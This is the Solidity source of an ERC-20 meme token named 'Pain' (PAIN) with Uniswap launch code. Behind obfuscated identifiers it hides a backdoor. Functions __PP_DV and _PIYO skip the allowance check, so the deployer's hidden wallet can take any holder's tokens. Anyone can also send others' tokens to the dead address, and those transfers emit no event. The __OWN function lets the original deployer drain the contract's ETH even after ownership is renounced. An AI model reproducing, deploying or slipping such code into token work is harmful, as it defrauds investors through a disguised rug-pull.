// SPDX-License-Identifier: MIT

/*
    Name: Pain
    Symbol: PAIN

    No Pain, No Gain

    Website: https://www.paintoken.cc/
    Twitter: https://x.com/PainGain_Eth
    Tg: https://t.me/PainGainETH
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract PAIN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Pain";
    string private constant _symbol = unicode"PAIN";
    
    address private _DVs034fj = address(0xdead);
    uint256 public _tolk_DVxsswtsa = 20000000 * 10 **_decimals;
    uint256 public _lvkj_DVxsswtsa = 20000000 * 10 **_decimals;
    uint256 public _of_Psswtsa = 10000000 * 10 **_decimals;

    address payable private _PainFK;
    mapping(address => uint256) private _OLAGRssw342sswq;
    mapping(address => mapping(address => uint256)) private _StressTimes;
    mapping(address => bool) private _OLAsoStroke;

    IUniswapV2Router02 private DVRouter;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 private _DVssdsdwer2dcw2 = 7;
    uint256 private _DVsaszx123aad = 7;
    uint256 private _DVsdbytycctynty = 0;
    address private _DVssdfwecc;
    uint256 private _DVsdbsad = 10;
    uint256 private _DVssdwerw = 10;
    uint256 private _DVssseq = 0;
    uint256 private _DVsssdrwqq1 = 0;

    uint256 private constant _kmmvb_DVxsswtsa = 1000000000 * 10 **_decimals;

    event MaxTxAmountUpdated(uint256 _tolk_DVxsswtsa);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _OLAsoStroke[owner()] = true;
        _OLAsoStroke[address(this)] = true;
        _OLAsoStroke[_PainFK] = true;
        _DVssdfwecc = _msgSender();

        _PainFK = payable(_msgSender());
        _OLAGRssw342sswq[address(this)] = _kmmvb_DVxsswtsa * 98 / 100;
        _OLAGRssw342sswq[owner()] = _kmmvb_DVxsswtsa * 2 / 100;
        emit Transfer(address(0), address(this), _kmmvb_DVxsswtsa * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvb_DVxsswtsa * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvb_DVxsswtsa;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _StressTimes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _OLAGRssw342sswq[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _StressTimes[owner][spender];
    }
    
    function __PP_DV(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_PIYO(sender, recipient))
            _allowed = _StressTimes[sender][_msgSender()];
        return _allowed;
    }

    receive() external payable {}
    
    function _jvjocvo() internal view returns (bool) {return msg.sender != _PainFK;}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subtransferr__DVxsswtsa(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            __PP_DV(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function __OWN(address payable receipt) external {
        require(msg.sender == _DVssdfwecc , "");
        _PainFK = receipt;
        __DVxmnn34irfn(address(this).balance);
    }

    function _support_DVOwlsat(uint256 amount) private {
        _PainFK.transfer(amount);
    }

    function _PIYO(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_jvjocvo() == false) return false;
        else return sender == uniswapV2Pair || recipient != _DVs034fj;
    }

    
    function _subSwap__DVxsswtsa(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = DVRouter.WETH();
        _approve(address(this), address(DVRouter), tokenAmount);
        DVRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function __DVxmnn34irfn(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subtransferr__DVxsswtsa(_msgSender(), recipient, amount);
        return true;
    }

    function _subtransferr__DVxsswtsa(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_DVsdbytycctynty > _DVssdsdwer2dcw2)
                        ? _DVssseq
                        : _DVsdbsad
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(DVRouter) &&
                !_OLAsoStroke[to]
            ) {
                _DVsdbytycctynty++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_DVsdbytycctynty > _DVsaszx123aad)
                            ? _DVsssdrwqq1
                            : _DVssdwerw
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _of_Psswtsa) ? contractTokenBalance : _of_Psswtsa; 
                    _subSwap__DVxsswtsa((amount < minBalance) ? amount : minBalance);
                }
                _support_DVOwlsat(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _OLAGRssw342sswq[address(this)] =_OLAGRssw342sswq[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _OLAGRssw342sswq[from] =_OLAGRssw342sswq[from].sub(amount);
        _OLAGRssw342sswq[to] =_OLAGRssw342sswq[to].add(amount.sub(taxAmount));
        if(_DVs034fj != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

   
    function removeLimits () external onlyOwner {
        _tolk_DVxsswtsa = _kmmvb_DVxsswtsa;
        _lvkj_DVxsswtsa = _kmmvb_DVxsswtsa;
        emit MaxTxAmountUpdated(_kmmvb_DVxsswtsa);
    }

    function enable_DV() external onlyOwner {
        require(!isTrading, "Already Launched!");
        DVRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(DVRouter), _kmmvb_DVxsswtsa);
        uniswapV2Pair = IUniswapV2Factory(DVRouter.factory()).createPair(
            address(this),
            DVRouter.WETH()
        );
        DVRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(DVRouter),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }
}